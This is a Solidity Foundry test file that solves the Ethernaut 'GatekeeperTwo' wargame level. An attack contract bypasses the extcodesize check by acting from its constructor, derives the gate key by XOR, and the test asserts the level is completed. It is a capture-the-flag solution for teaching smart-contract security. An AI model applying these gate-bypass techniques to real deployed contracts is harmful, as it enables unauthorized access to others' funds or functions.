pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/14-GatekeeperTwo/GatekeeperTwoFactory.sol';
import '../core/Ethernaut.sol';

contract GatekeeperAttack {
  /*
    NOTE: if we placed this attack code in a separate function to 
    call, it would have a extcodesize higher than 0 and fail gateTwo
  */
  constructor(address _targetAddr) {
    uint64 _valueA = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); // emulate the value used in contract
    uint64 _valueB = type(uint64).max;  // just get max, so we don't need unchecked math
    uint64 _valueC = _valueA ^ _valueB; // should be the key as we are basically doing opposite to the req?!
    // by creating valueC, we can then 'emulate' that the contract XOR will be
    // _valueA ^ _valueC == will equal type(uint64).max
    require(_valueA ^ _valueC == type(uint64).max);

    GatekeeperTwo(_targetAddr).enter(bytes8(_valueC));
  }
}

contract GatekeeperTwoTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testGatekeeperTwoHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
    ethernaut.registerLevel(gatekeeperTwoFactory);
    vm.startPrank(tx.origin);

    address levelAddress = ethernaut.createLevelInstance(gatekeeperTwoFactory);
    GatekeeperTwo gatekeeperTwoContract = GatekeeperTwo(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    GatekeeperAttack attackContract = new GatekeeperAttack(address(gatekeeperTwoContract));
    
    // Note: we need to pack values into the single key value which will meet the following reqs:
    /*
      We need:
      
      Gate One:
      Just send it from another contract

      Gate Two:
      To ensure we have a extcodesize(caller()) of 0, our calling contract
      needs to not have anything in there that would create size on the contract.
      We can pass this check by just putting the attack in the constructor logic
    
      Gate Three:
      We know the uint64 on the left side, we can calculate this by
      1) cloning the code
      2) XOR it with uint64.max
      3) require check that XORing part (1) with the result of (2) is == uint64.max
      
      This is our key once cast to bytes8 (we are a uint64 so bits match)
    
      XOR sets the bits to 0 or 1 depending on the values XOR (they MUST be different, unlike AND)
      0 ^ 0 == 0
      1 ^ 0 == 1
      0 ^ 1 == 1
      1 ^ 1 == 0

      Example of getting a 0x1111111 result:
        0x00001111
        0x11110000
      = 0x11111111
    */

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

